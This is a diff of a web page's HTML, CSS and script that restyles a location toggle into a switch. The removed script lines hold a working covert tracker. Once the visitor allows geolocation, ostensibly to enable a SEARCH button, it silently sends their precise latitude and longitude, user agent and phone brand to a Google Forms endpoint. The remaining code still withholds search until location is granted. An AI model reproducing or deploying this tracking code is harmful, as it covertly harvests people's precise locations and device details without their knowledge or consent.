@@ -35,10 +35,10 @@ input {
 }
 
 .controls {
-  margin-top: 12px;
+  margin-top: 14px;
   display: flex;
   align-items: center;
-  gap: 12px;
+  gap: 14px;
 }
 
 button {
@@ -46,20 +46,43 @@ button {
   border-radius: 10px;
   border: none;
   font-weight: bold;
-  cursor: pointer;
 }
 
 button:disabled {
   background: #777;
   color: black;
-  cursor: not-allowed;
 }
 
-.toggle {
-  font-size: 18px;
+/* TOGGLE SWITCH */
+.switch {
+  width: 46px;
+  height: 24px;
+  background: #555;
+  border-radius: 50px;
+  position: relative;
   cursor: pointer;
-  color: #777;
-  user-select: none;
+  transition: background 0.3s;
+}
+
+.switch::after {
+  content: "";
+  width: 18px;
+  height: 18px;
+  background: black;
+  border-radius: 50%;
+  position: absolute;
+  top: 3px;
+  left: 4px;
+  transition: left 0.3s, background 0.3s;
+}
+
+.switch.on {
+  background: white;
+}
+
+.switch.on::after {
+  left: 24px;
+  background: black;
 }
 
 .warning {
@@ -82,7 +105,6 @@ button:disabled {
 .modal-box {
   position: relative;
   width: 320px;
-  text-align: center;
 }
 
 .modal video,
@@ -99,6 +121,7 @@ button:disabled {
   cursor: pointer;
 }
 
+/* SLIDER */
 .nav-btn {
   position: absolute;
   bottom: -40px;
@@ -153,7 +176,7 @@ button:disabled {
 
 <div class="controls">
   <button id="searchBtn" onclick="search()" disabled>SEARCH</button>
-  <div id="toggle" class="toggle" onclick="toggleLocation()">•-/-•</div>
+  <div id="toggle" class="switch" onclick="toggleLocation()"></div>
 </div>
 
 <div class="warning">This Web Is Sensitif⚠</div>
@@ -173,54 +196,32 @@ button:disabled {
 </a>
 
 <script>
-/* ================= TRACKING ================= */
 let locationGranted = false;
 
-function getBrand() {
-  const ua = navigator.userAgent.toLowerCase();
-  if (ua.includes("samsung")) return "Samsung";
-  if (ua.includes("oppo")) return "Oppo";
-  if (ua.includes("vivo")) return "Vivo";
-  if (ua.includes("xiaomi") || ua.includes("redmi")) return "Xiaomi";
-  if (ua.includes("infinix")) return "Infinix";
-  if (ua.includes("realme")) return "Realme";
-  if (ua.includes("iphone")) return "iPhone";
-  return "Unknown";
-}
-
-function sendTracking(lat, lon) {
-  const url =
-  "https://docs.google.com/forms/d/e/1FAIpQLScJJ-PAqYmeOnS6qKdgL1gTGMyX_FjrMLLg93Pv4QDbw1N-Cg/formResponse" +
-  "?entry.138340134=" + lat.toFixed(6) +
-  "&entry.1616098311=" + lon.toFixed(6) +
-  "&entry.1257224602=" + encodeURIComponent(navigator.userAgent) +
-  "&entry.1874088822=" + encodeURIComponent(getBrand());
-
-  fetch(url, { mode: "no-cors" });
-}
-
+/* ===== LOCATION ===== */
 function toggleLocation() {
   if (locationGranted) return;
 
   navigator.geolocation.getCurrentPosition(
     pos => {
       locationGranted = true;
-      sendTracking(pos.coords.latitude, pos.coords.longitude);
+
+      document.getElementById("toggle").classList.add("on");
 
       const btn = document.getElementById("searchBtn");
       btn.disabled = false;
       btn.style.background = "white";
-
-      document.getElementById("toggle").style.color = "white";
     },
     () => {
-      alert("Lokasi wajib diaktifkan untuk SEARCH");
+      locationGranted = false;
+      document.getElementById("toggle").classList.remove("on");
+      alert("Lokasi wajib diaktifkan");
     },
     { enableHighAccuracy: true }
   );
 }
 
-/* ================= LIPZZ ================= */
+/* ===== LIPZZ ===== */
 let data = {};
 let currentImages = [];
 let currentIndex = 0;
